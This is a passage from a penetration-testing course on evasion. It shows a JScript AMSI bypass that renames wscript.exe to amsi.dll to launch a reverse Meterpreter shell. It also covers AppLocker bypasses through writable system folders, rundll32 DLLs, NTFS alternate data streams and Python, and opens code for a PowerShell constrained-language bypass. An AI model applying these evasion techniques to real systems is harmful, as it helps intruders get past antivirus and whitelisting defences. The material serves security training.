    filesys.CopyFile("C:\\Windows\\System32\\wscript.exe", 
"C:\\Windows\\Tasks\\AMSI.dll"); 
    sh.Exec("C:\\Windows\\Tasks\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} 
"+WScript.ScriptFullName); 
    WScript.Quit(1); 
} 
Listing 328 - AMSI bypass that renames wscript.exe to amsi.dll 
In the try statement, we first detect if the copied executable already exists through the FileExists 
method416 of the FileSystemObject object. If it does, we execute the DotNetToJscript-generated 
shellcode runner. 
If it does not yet exist, we trigger an exception and the code in the catch section is executed. Here, 
we use the CopyFile417 method to copy wscript.exe into the C:\Windows\Tasks folder and name it 
“AMSI.DLL”. 
Next, we use the Exec method to execute the copied version of wscript.exe and again process it 
as a Jscript file, just as we did in the last section. 
 
413 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecutea 
414 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa 
415 (SS64, 2020), https://ss64.com/vb/exec.html 
416 (SS64, 2020), https://ss64.com/vb/filesystemobject.html 
417 (SS64, 2020), https://ss64.com/vb/filesystemobject.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
263 
When we execute the combined Jscript file, we obtain a reverse Meterpreter shell but something 
unexpected happens. An antivirus alert pops up as shown in Figure 94. 
 
Figure 94: Antivirus alert due to AMSI bypass 
In this case, the reverse shell launched (indicating that we bypassed AMSI) but Windows 
Defender detected a new process named “amsi.dll” and flagged our code. In this case, we had a 
working shell for a brief period of time, but it was killed as soon as Windows Defender flagged it. 
We can work around this by immediately migrating the process, which will keep our migrated 
shell alive. Alternatively, we could use a shellcode runner that performs process injection or 
hollowing. 
Although we have lost the element of stealth by triggering Windows Defender, this bypass will 
work against all antivirus vendors that support AMSI and some products may not even detect the 
“amsi.dll” process. 
7.6.3.1 Exercises 
1. 
Recreate the AMSI bypass by renaming wscript.exe to “amsi.dll” and executing it. 
2. 
Instead of a regular shellcode runner, implement this bypass with a process injection or 
hollowing technique and obtain a Meterpreter shell that stays alive after the detection. 
7.7 Wrapping Up 
In this module, we thoroughly investigated the Anti-Malware Scan Interface and have witnessed 
its effectiveness against public tradecraft that relies on PowerShell and Jscript. 
We have also successfully bypassed this protection in various ways that will be very difficult for 
antivirus vendors to mitigate. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
264 
 
8 Application Whitelisting 
Our analysis of antivirus bypass techniques in the previous module revealed that AV bypass is 
fairly straight-forward, even when using existing tools and frameworks. However, many 
organizations improve the security level of their endpoints with application whitelisting 
technology, which employs monitoring software that blocks all applications except those on a 
pre-defined whitelist. This effectively blocks custom applications or code, including many tools 
used by an attacker to obtain remote access or escalate privileges. 
In this module, we’ll introduce application whitelisting and explore a variety of bypass techniques. 
We will rely on existing and trusted applications, in a technique known as “Living off the land” 
(coined in the LOLBAS and LOLBIN418 project). 
Application whitelisting impacts both our ability to obtain initial code execution as well as 
subsequent post-exploitation. In this module, we’ll explore application whitelisting software 
installed by default on Microsoft Windows, which is the most common client endpoint. We’ll also 
develop multiple bypasses and demonstrate how our existing post-exploitation tools can be 
reused. 
8.1 Application Whitelisting Theory and Setup 
Application whitelisting is a very effective protection mechanism, but it can be difficult to manage 
and deploy at scale, and is not commonly deployed by larger organizations. 
A typical Windows-based application whitelisting solution is installed as either a filter driver or 
through the HyperVisor.419 In this section, we’ll discuss the theory behind these implementations. 
8.1.1 Application Whitelisting Theory 
The native Microsoft whitelisting implementation leverages a kernel-mode filter driver and various 
native kernel APIs. 
Specifically, the Microsoft kernel-mode PsSetCreateProcessNotifyRoutineEx420 API registers a 
notification callback which allows the execution of a provided kernel-mode function every time a 
new process is created. Application whitelisting software uses a custom driver to register a 
callback function through this API. This callback is then invoked every time a new process is 
created and it allows the whitelisting software to determine whether or not the application is 
whitelisted. 
If the software determines that the application is allowed, process creation completes and the 
code will execute. On the other hand, if the application is not allowed, the process is terminated, 
and an error message may be displayed. As the name suggests, whitelisting software will block 
everything except applications specifically listed in a configurable ruleset. 
 
418 (LOLBAS, 2020), https://lolbas-project.github.io/ 
419 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Hypervisor 
420 (MSDN, 2018), https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-
pssetcreateprocessnotifyroutineex?redirectedfrom=MSDN 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
265 
Microsoft provides multiple native application whitelisting solutions. 
Prior to Windows 7, Microsoft introduced the Software Restriction Policies (SRP)421 whitelisting 
solution. It is still available but has been superseded by AppLocker,422 which was introduced with 
Windows 7 and is still available in current versions of Windows 10. 
AppLocker components include the kernel-mode driver APPID.SYS and the APPIDSVC user-mode 
service. APPIDSVC manages the whitelisting ruleset and identifies applications when they are run 
based on the callback notifications from APPID.SYS. 
Third party (bundled) whitelisting solutions include Symantec Application 
Control,423 Sophos Endpoint: Application Control424 and McAfee Application 
Control.425 Each operate similarly by setting notification callbacks with 
PsSetCreateProcessNotifyRoutineEx. The bypasses we explore here will work 
similarly against these products with minor modifications. 
Microsoft recently released a new type of application whitelisting solution with Windows 10, 
which is enforced from the HyperVisor, subsequently operating at a deeper level than kernel-
mode solutions. Originally introduced as Device Guard, it was recently rebranded as Windows 
Defender Application Control (WDAC),426 which performs whitelisting actions in both user-mode 
and kernel-mode. 
WDAC builds on top of the Virtualization-based Security (VBS) and HyperVisor 
Code Integrity (HVCI)427 concepts, which are only available on Windows 10 and 
Server 2016/2019. These concepts are beyond the scope of this module, but due 
to the implementation complexity and strict hardware requirements, it is rarely 
deployed. 
Now that we’ve briefly discussed the basic application whitelisting software theory, we’ll begin 
configuring whitelisting rules for AppLocker, one of the more commonly-deployed solutions. Note 
that AppLocker is only available on Enterprise and Ultimate editions of Windows, which excludes 
Windows Professional and other versions. 
 
421 (Microsoft, 2016), https://docs.microsoft.com/en-us/windows-server/identity/software-restriction-policies/software-restriction-
policies 
422 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-
control/applocker/what-is-applocker 
423 (Symantec, 2020), https://docs.broadcom.com/doc/endpoint-application-control-en 
424 (Sophos, 2020), https://docs.sophos.com/central/Customer/help/en-us/central/Customer/tasks/ConfigureAppControl.html 
425 (McAfee, 2020), https://www.mcafee.com/enterprise/en-us/products/application-control.html 
426 (Microsoft, 2019), https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-
control/windows-defender-application-control 
427 (Microsoft, 2019), https://docs.microsoft.com/en-us/windows/security/threat-protection/device-guard/introduction-to-device-
guard-virtualization-based-security-and-windows-defender-application-control 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
266 
8.1.2 AppLocker Setup and Rules 
There are three primary AppLocker rule categories, which can be combined as needed. The first 
and most simple rule is based on file paths.428 This rule can be used to whitelist a single file based 
on its filename and path or recursively include the contents of a directory. 
The second rule type is based on a file hash429 which may allow a single file to execute regardless 
of the location. To avoid collisions, AppLocker uses a SHA256 Authenticode hash. 
The third rule type is based on a digital signature,430 which Microsoft refers to as a publisher. This 
rule could whitelist all files from an individual publisher with a single signature, which simplifies 
whitelisting across version updates. 
To get started with a simple case study, we’ll set up some basic AppLocker whitelisting rules. In 
order to simplify our testing, we’ll login to the Windows 10 victim as “student” since 
administrators will be exempt from the rules we’ll create. 
Let’s open an administrative command prompt, enter the “offsec” user credentials and launch 
gpedit.msc, the GPO configuration manager. 
In the Local Group Policy Editor, we’ll navigate to Local Computer Policy -> Computer 
Configuration -> Windows Settings -> Security Settings -> Application Control Policies and select 
the AppLocker item as shown in Figure 95. 
 
428 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-
control/applocker/create-a-rule-that-uses-a-path-condition 
429 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-
control/applocker/create-a-rule-that-uses-a-file-hash-condition 
430 (Micosoft, 2017), https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-
control/applocker/create-a-rule-that-uses-a-publisher-condition 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
267 
 
Figure 95: Main AppLocker menu in Local Group Policy Editor 
The rule creation and configuration process consists of several steps. First, we’ll click Configure 
rule enforcement to open the properties for AppLocker as highlighted above in Figure 95. 
In the Properties menu, we can enable AppLocker rules for Executables, Windows Installer files, 
scripts, and packaged apps: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
268 
 
Figure 96: AppLocker properties 
This will set four rule properties which enable enforcement for four separate file types. The first 
property relates specifically to executables with the .exe file extension and the second relates to 
Windows Installer files431 which use the “.msi” file extension. 
The third property relates to PowerShell scripts, Jscript scripts, VB scripts and older file formats 
using the .cmd and .bat file extensions. This property does not include any third-party scripting 
engines like Python nor compiled languages like Java. 
The fourth property relates to Packaged Apps432 (also known as Universal Windows Platform 
(UWP) Apps) which include applications that can be installed from the Microsoft App store. 
For each of these four categories, we will select “Configured”. In addition, we can choose to 
“Enforce rules” to enable the rule and enforce whitelisting or “Audit only” which will allow 
execution and write an entry to the Windows event log. 
We’ll configure AppLocker to enforce rules for all four categories, click Apply and OK to close the 
window. 
 
431 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-portal 
432 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/uwp/get-started/universal-application-platform-guide 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
269 
Next, we must configure rules for each of these four categories. We’ll do this from the options in 
the lower part of the main window titled “Overview”, as displayed in Figure 97. 
 
Figure 97: Options to configure rules for each of the file type categories 
We’ll first click Executable Rules to open a new window where we can enter the whitelisting rules 
related to each specific property. 
Right-clicking the pane presents two options for rule creation. The first is “Create New Rule…” 
which will let us define a custom rule based on any of the three rule types. The second, “Create 
Default Rules”, will automatically apply the default AppLocker rules. 
We’ll begin with the default rules, which will be easier to work with. As we progress through the 
module, we’ll add additional rules to further harden the box. 
Once we’ve chosen to apply the default rules, they will be added to the pane as shown in Figure 
98. 
 
Figure 98: Options to configure rules for each of the file type categories 
This should block all applications except those explicitly allowed. 
Specifically, the two first rules will allow all users to run executables in C:\Program Files, 
C:\Program Files (x86), and C:\Windows recursively, including executables in all subfolders. This 
allows basic operating system functionality but prevents non-administrative users from writing in 
these folders due to default access rights. 
The third rule allows members of the administrative group to run any executables they desire. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
270 
The other three categories have similar default rules. We’ll enable them to configure basic 
application whitelisting protection on our Windows 10 victim VM. 
Once we have created all the default rules, we must close the Local Group Policy Editor, and run 
gpupdate /force from the admin command prompt to refresh the active group policies. 
Now that AppLocker is configured and enabled, non-admin users should not be able to execute 
any executable or script outside C:\Program Files, C:\Program Files (x86) and C:\Windows. 
To test this, we’ll start a command prompt as “student” in a non-admin context. We’ll copy the 
native calc.exe executable from C:\Windows\System32 into the current directory and attempt to 
execute it (Listing 329). 
C:\Users\student>copy C:\Windows\System32\calc.exe calc2.exe 
        1 file(s) copied. 
 
C:\Users\student>calc2.exe 
This program is blocked by group policy. For more information, contact your system 
administrator. 
 
C:\Users\student> 
Listing 329 - AppLocker is blocking the executable from running 
The error highlighted in Listing 329 was generated by AppLocker, which blocked execution. 
AppLocker logs each violation in the Windows event log. To view this message, we’ll open “Event 
Viewer”, press G+r, enter “eventvwr”, navigate to Applications and Services Logs -> Microsoft -> 
Windows -> AppLocker and click EXE and DLL as shown in Figure 99. 
 
Figure 99: Eventlog entry for AppLocker 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
271 
 
The error highlighted in the figure above reveals that execution of calc2.exe has been blocked. 
8.1.2.1 Exercises 
1. 
Configure default rules for all four categories of file types and enable AppLocker on your 
Windows 10 victim VM. 
2. 
Copy an executable to a location outside the whitelisted folders and observe how it is 
blocked by AppLocker when executing it. 
3. 
Create a small Jscript script, store it outside the whitelisted folders and execute it. Is it 
blocked? 
8.2 Basic Bypasses 
So far, we have walked through the different types of rules and the categories of file types 
protected by AppLocker. We have configured our Windows 10 victim VM with the default 
AppLocker rules and we’re ready to explore various bypasses. 
In the following sections, we’ll specifically focus on a variety of simple bypasses that stem from 
the relatively poor configuration enforced through the default rules. We’ll also demonstrate 
bypasses that leverage limitations of AppLocker itself. 
8.2.1 Trusted Folders 
The default rules for AppLocker whitelist all executables and scripts located in C:\Program Files, 
C:\Program Files (x86), and C:\Windows. This is a logical choice since it is assumed that non-
admin users cannot write executables or scripts into these directories. 
In this section, we will put this assumption to the test as we construct our first (albeit very simple) 
AppLocker bypass. 
In theory, we should be able to execute a program or script in a subdirectory that allows both 
write and execute. If we can find writable and executable folders on a development machine, we 
can reuse the bypass later on a compromised machine which has the same rules applied. 
To locate user-writable folders, we’ll use AccessChk from SysInternals,433 which is located in 
C:\Tools\SysInternalsSuite on our Windows 10 victim VM. For this test, we’ll execute it from an 
administrative command prompt to avoid potential AppLocker restrictions. 
We’ll search C:\Windows with AccessChk, using -w to locate writable directories, -u to suppress 
any errors and -s to recurse through all subdirectories: 
C:\Tools\SysinternalsSuite>accesschk.exe "student" C:\Windows -wus 
 
Accesschk v6.12 - Reports effective permissions for securable objects 
Copyright (C) 2006-2017 Mark Russinovich 
Sysinternals - www.sysinternals.com 
 
RW C:\Windows\Tasks 
 
433 (Microsoft, 2017), https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
272 
RW C:\Windows\Temp 
RW C:\Windows\tracing 
RW C:\Windows\Registration\CRMLog 
RW C:\Windows\System32\FxsTmp 
 W C:\Windows\System32\Tasks 
RW C:\Windows\System32\AppLocker\AppCache.dat 
RW C:\Windows\System32\AppLocker\AppCache.dat.LOG1 
RW C:\Windows\System32\AppLocker\AppCache.dat.LOG2 
 W C:\Windows\System32\Com\dmp 
RW C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys 
 W C:\Windows\System32\spool\PRINTERS 
 W C:\Windows\System32\spool\SERVERS 
RW C:\Windows\System32\spool\drivers\color 
RW C:\Windows\System32\Tasks\OneDrive Standalone Update Task-S-1-5-21-50316519-
3845643015-1778048971-1002 
... 
Listing 330 - Enumeration of writable subfolders in C:\Windows with AccessChk 
Surprisingly, the original output returned by the command is quite lengthy. The full output reveals 
29 writeable subdirectories. Next, we must determine if any of them are also executable. 
We’ll use the native icacls434 tool from an administrative command prompt to check each of the 
writable folders. For example, we’ll first check the C:\Windows\Tasks directory: 
C:\Tools\SysinternalsSuite>icacls.exe C:\Windows\Tasks 
C:\Windows\Tasks NT AUTHORITY\Authenticated Users:(RX,WD) 
                 BUILTIN\Administrators:(F) 
                 BUILTIN\Administrators:(OI)(CI)(IO)(F) 
                 NT AUTHORITY\SYSTEM:(F) 
                 NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F) 
                 CREATOR OWNER:(OI)(CI)(IO)(F) 
 
Successfully processed 1 files; Failed processing 0 files 
Listing 331 - Using icacls to check if a folder is executable 
The output indicates the RX flag (associated with the NT AUTHORITY\Authenticated Users group) 
is set for C:\Windows\Tasks, meaning that any user on the system will have both read and 
execute permissions within the directory. Based on the output of these tools, the student user will 
have both write and execute permissions within this directory. 
To test this out, we’ll copy calc.exe to C:\Windows\Tasks and execute it, as shown in Figure 100. 
 
434 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
273 
 
Figure 100: Bypassing AppLocker through a whitelisted folder 
The program runs, indicating that we have bypassed the default AppLocker application 
whitelisting rules. 
8.2.1.1 Exercises 
1. 
Repeat the analysis to verify that C:\Windows\Tasks is both writable and executable for the 
“student” user. Execute a copied executable from this directory. 
2. 
Locate another directory in C:\Windows that could be used for this bypass. 
3. 
Copy a C# shellcode runner executable into one of the writable and executable folders and 
bypass AppLocker to obtain a reverse shell. 
4. 
Create a custom AppLocker rule to block the folder C:\Windows\Tasks. Make it a path rule of 
type deny. Consult the online documentation if needed. 
8.2.2 Bypass With DLLs 
In the previous sections, we relied on basic AppLocker rules, ignoring rule types associated with 
dynamic link libraries. The default ruleset doesn’t protect against loading arbitrary DLLs. If we 
were to create an unmanaged DLL, we would be able to load it and trigger exported APIs to gain 
arbitrary code execution. 
Let’s demonstrate this with an unmanaged DLL. We’ll use a simple unmanaged DllMain function 
along with an exported run function that opens a message box when executed: 
#include "stdafx.h" 
#include <Windows.h> 
 
BOOL APIENTRY DllMain( HMODULE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
274 
                     ) 
{ 
    switch (ul_reason_for_call) 
    { 
    case DLL_PROCESS_ATTACH: 
    case DLL_THREAD_ATTACH: 
    case DLL_THREAD_DETACH: 
    case DLL_PROCESS_DETACH: 
        break; 
    } 
    return TRUE; 
} 
 
extern "C" __declspec(dllexport) void run() 
{ 
    MessageBoxA(NULL, "Execution happened", "Bypass", MB_OK); 
} 
Listing 332 - C code for an unmanaged DLL that opens a message box 
This code has already been compiled and saved as C:\Tools\TestDll.dll on the Windows 10 victim 
VM. 
To load an unmanaged DLL, we’ll use the native rundll32 tool which accepts the full path to the 
DLL along with the exported function to execute, as shown in Figure 101. 
 
Figure 101: Bypassing AppLocker using a DLL 
Although this is basic code, it demonstrates that DLLs are not restricted by the current AppLocker 
rules. 
We can, however, enforce DLL whitelisting with AppLocker, again through the Local Group Policy 
Editor. Let’s do that now. 
Reopening the rule enforcement window in the group policy editor, we’ll click the “Advanced” tab. 
This presents a warning about system performance issues related to DLL whitelisting 
enforcement and offers the option to enable it. 
After checking “Enable the DLL rule collection” and clicking Apply, we’ll return to the original 
“Enforcement” tab which presents a new entry related to DLLs as shown in Figure 102. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
275 
 
Figure 102: Configuring AppLocker DLL rules enforcement 
Here, we’ll enable DLL enforcement and return to the main AppLocker configuration window. A 
“DLL Rules” section now allows us to create default rules. 
Once everything is configured, we’ll once again execute gpupdate /force from an administrative 
command prompt to activate the settings. 
To test the configured rules, we’ll attempt to load TestDll.dll with rundll32. This presents the 
AppLocker error message shown in Figure 103. 
 
Figure 103: AppLocker DLL rules blocking DLL loading 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
276 
 
The DLL has been blocked. Unless the default rules DLL Enforcement rules have been modified, 
we could bypass whitelisting by copying TestDll.dll into C:\Windows\Tasks. 
8.2.2.1 Exercises 
1. 
Bypass AppLocker by executing the proof-of-concept DLL C:\Tools\TestDll.dll, as shown in 
this section. 
2. 
Generate a Meterpreter DLL with msfvenom and use that together with rundll32 to bypass 
AppLocker to obtain a reverse shell. 
3. 
Enable default rules for DLLs and verify that the Meterpreter DLL is blocked. 
8.2.2.2 Extra Mile 
Examine the default Windows Installer rules and determine how it would be possible to bypass 
those. 
8.2.3 Alternate Data Streams 
So far, we have demonstrated various ways of bypassing AppLocker if the rules are not 
appropriately configured. In this section, we’ll work through a slightly more advanced bypass that 
abuses a feature of the Windows file system itself. 
Th modern Windows file system is based on the NTFS435 specification, which represents all files 
as a stream of data.436 While the inner workings of NTFS are complex, for the purposes of this 
module, it’s important to simply understand that NTFS supports multiple streams. 
An Alternate Data Stream (ADS) is a binary file attribute that contains metadata. We can leverage 
this to append the binary data of additional streams to the original file. 
To demonstrate this, we’ll create the small Jscript file shown in Listing 333: 
var shell = new ActiveXObject("WScript.Shell"); 
var res = shell.Run("cmd.exe"); 
Listing 333 - Simple Jscript proof of concept 
We’ll save this as test.js in the student user’s home directory. Since we have AppLocker scripting 
rules in place, we cannot execute it in its current location. However, if we can find a file in a 
trusted location that is both writable and executable, we could write the contents of this script to 
an alternate data stream inside that file and execute it, bypassing AppLocker. 
For example, TeamViewer version 12, which is installed on the Windows 10 victim machine, uses 
a log file (TeamViewer12_Logfile.log) that is both writable and executable by the student user. We 
can use the native type437 command to copy the contents of test.js into an alternate data stream 
of the log file with the : notation: 
 
435 (Microsoft, 2018), https://support.microsoft.com/en-us/help/100108/overview-of-fat-hpfs-and-ntfs-file-systems 
436 (Microsoft, 2019), https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fscc/c54dec26-1551-4d3a-a0ea-
4fa40f848eb3 
437 (Microsoft, 2019), https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/type 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
277 
C:\Users\student>type test.js > "C:\Program Files 
(x86)\TeamViewer\TeamViewer12_Logfile.log:test.js" 
Listing 334 - Copying the contents of test.js into an ADS of the log file 
We’ll use dir /r to verify that the Jscript code was written to the alternate data stream: 
C:\Users\student>dir /r "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log" 
 Volume in drive C has no label. 
 Volume Serial Number is 305C-7C84 
 
 Directory of C:\Program Files (x86)\TeamViewer 
 
03/09/2020  08:34 AM            32,489 TeamViewer12_Logfile.log 
                                    79 TeamViewer12_Logfile.log:test.js:$DATA 
               1 File(s)         32,489 bytes 
               0 Dir(s)     696,483,840 bytes free 
Listing 335 - Verifying the ADS section with dir 
The output in Listing 335 indicates that the script has been written to the alternate data stream. 
Now we must execute it. 
If we simply double-click the icon for the log file, it would open the log (the primary stream) in 
Notepad as a standard log file. 
However, if we execute it from the command line with wscript, specifying the ADS, the Jscript 
content is executed instead, as shown in Figure 104. 
 
Figure 104: Executing the contents of the alternate data stream 
In this case, the Jscript code executed and opened a new command prompt, despite the 
AppLocker script rules. 
8.2.3.1 Exercises 
1. 
Repeat the exercise to embed simple Jscript code inside an alternative data stream to 
obtain execution. 
2. 
Replace the current Jscript code with a DotNetToJscript shellcode runner and obtain a 
Meterpreter reverse shell. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
278 
8.2.4 Third Party Execution 
As previously stated, AppLocker only enforces rules against native Windows executable data file 
types. If a third-party scripting engine like Python or Perl is installed, we could use it to very easily 
bypass application whitelisting. 
To demonstrate this, we’ll create a small Python script and execute it: 
C:\Users\student>echo print("This executed") > test.py 
 
C:\Users\student>python test.py 
This executed 
Listing 336 - Bypassing AppLocker with Python 
The output from Listing 336 shows that AppLocker may easily be bypassed through a third-party 
scripting engine, but of course, it must be previously installed, which is rare in most traditional 
environments. 
Similarly, AppLocker does not block execution of high-level languages such as Java, although this 
again requires the Java Runtime Environment to be installed, which is a more common 
occurrence. 
Even more interesting is the lack of enforcement against VBA code inside Microsoft Office 
documents. If a Microsoft Office document is saved to a non-whitelisted folder, AppLocker 
cannot restrict execution of its embedded macros, allowing for reuse of our previously developed 
tradecraft. This highlights the usefulness of Office documents in client-side attacks. 
8.2.4.1 Exercise 
1. 
Generate a Python reverse Meterpreter payload with msfvenom and use that to bypass 
AppLocker and get a reverse Meterpreter shell. 
8.3 Bypassing AppLocker with PowerShell 
In previous sections we executed simple bypasses. In the remaining sections, we will investigate 
advanced and increasingly complex bypasses and reuse previously-developed tradecraft that 
bypasses non-standard AppLocker rulesets. 
Our previously developed tradecraft relied heavily on PowerShell which, as previously 
demonstrated, can easily bypass detection mechanisms like AMSI. In this section, we will analyze 
the various restrictions Applocker places on PowerShell and demonstrate various bypasses. 
8.3.1 PowerShell Constrained Language Mode 
The PowerShell execution policy restricts the execution of scripts, but this is a weak protection 
mechanism which can be easily bypassed with the built-in “Bypass” execution policy. However, 
the more robust Language Modes438 limit the functionality to avoid execution of code like our 
shellcode runner and operates at three distinct levels. 
 
438 (Microsoft, 2019), https://docs.microsoft.com/en-
us/powershell/module/microsoft.powershell.core/about/about_language_modes?view=powershell-7 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
279 
The first (and default) level, FullLanguage, allows all cmdlets and the entire .NET framework as 
well as C# code execution. By contrast, NoLanguage disallows all script text. RestrictedLanguage 
offers a compromise, allowing default cmdlets but heavily restricting much else. 
These settings are relatively uncooperative. For example, it would be difficult to allow 
administrative execution, while allowing execution of scripts we trust and blocking scripts 
belonging to a user (malicious or otherwise). 
To address this, Microsoft introduced the ConstrainedLanguage mode (CLM) with PowerShell 
version 3.0. When AppLocker (or WDAC) is enforcing whitelisting rules against PowerShell scripts, 
ConstrainedLanguage is enabled as well. 
On Windows 7, 8.1 and earlier versions of Windows 10, PowerShell version 2 was 
installed by default along with the most recent version of PowerShell. On these 
systems, it may be possible to bypass constrained language mode by specifying 
version two of PowerShell (-v2) when starting the process. 
Under ConstrainedLanguage, scripts that are located in whitelisted locations or otherwise comply 
with a whitelisting rule can execute with full functionality. However, if a script does not comply 
with the rules, or if commands are entered directly on the command line, ConstrainedLanguage 
imposes numerous restrictions. 
The most significant limitation excludes calls to the .NET framework, execution of C# code and 
reflection. 
To demonstrate this, let’s open a PowerShell prompt in the context of the “student” user and 
attempt to invoke the .NET framework, as shown in Listing 337. 
PS C:\Users\student> [Math]::Cos(1) 
Cannot invoke method. Method invocation is supported only on core types in this 
language mode. 
At line:1 char:1 
+ [Math]::Cos(1) 
+ ~~~~~~~~~~~~~~ 
    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException 
    + FullyQualifiedErrorId : MethodInvocationNotSupportedInConstrainedLanguage 
Listing 337 - Constrained Language mode is blocking access to .NET functionality 
As evidenced by the highlighted warning in the listing above, we cannot access the otherwise 
simple cosine function in the Math namespace of .NET. This warning is indicative of constrained 
language mode. 
The language mode of the current PowerShell session or prompt is always stored in the 
$ExecutionContext.SessionState.LanguageMode variable which can be displayed as follows: 
PS C:\Users\student> $ExecutionContext.SessionState.LanguageMode 
ConstrainedLanguage 
Listing 338 - Finding the language mode of the current PowerShell session 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
280 
In contrast, let’s open a second PowerShell prompt with administrative privileges in the context of 
the “Offsec” user and dump the contents of the same variable: 
PS C:\Windows\system32> $ExecutionContext.SessionState.LanguageMode 
FullLanguage 
PS C:\Windows\system32> [Math]::Cos(1) 
0.54030230586814 
Listing 339 - Administrative PowerShell prompt is in FullLanguage mode 
Obviously this is our preferred language mode, as it is unrestricted, allowing us to reuse all our 
previous tradecraft. However, in the next section we’ll dig deeper into .NET and develop code that 
will bypass constrained language mode. 
8.3.1.1 Exercises 
1. 
Verify that constrained language mode is enabled for a PowerShell prompt executed in the 
context of the “student” user. 
2. 
Check if our existing PowerShell shellcode runner is stopped once constrained language 
mode is enabled. 
8.3.2 Custom Runspaces 
Before exploring constrained language bypass techniques we must first explore the various 
components of a typical PowerShell implementation. 
PowerShell.exe is essentially a GUI application handling input and output. The real functionality 
lies inside the System.Management.Automation.dll managed DLL, which PowerShell.exe calls to 
create a runspace. 
It is possible to leverage multithreading439 and parallel task execution through either Jobs or 
Runspaces. The APIs for creating a runspace are public and available to managed code written in 
C#. 
This means we could code a C# application that creates a custom PowerShell runspace and 
executes our script inside it. This is beneficial since, as we will demonstrate, custom runspaces 
are not restricted by AppLocker. Using this approach, we can construct a constrained language 
mode bypass to allow arbitrary PowerShell execution. 
We will have to bypass executable rules to execute this C# code, but we will 
address this in a later section. 
To begin, let’s turn to our Windows 10 development machine to create a new C# Console App 
project. In this project we’ll create a runspace through the CreateRunspace method of the 
System.Management.Automation.Runspaces namespace: 
 
439 (Microsoft, 2015), https://devblogs.microsoft.com/scripting/beginning-use-of-powershell-runspaces-part-1/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
281 
using System; 
using System.Management.Automation; 
using System.Management.Automation.Runspaces; 
 
namespace Bypass 
{ 
    class Program 
    { 
        static void Main(string[] args) 
        { 
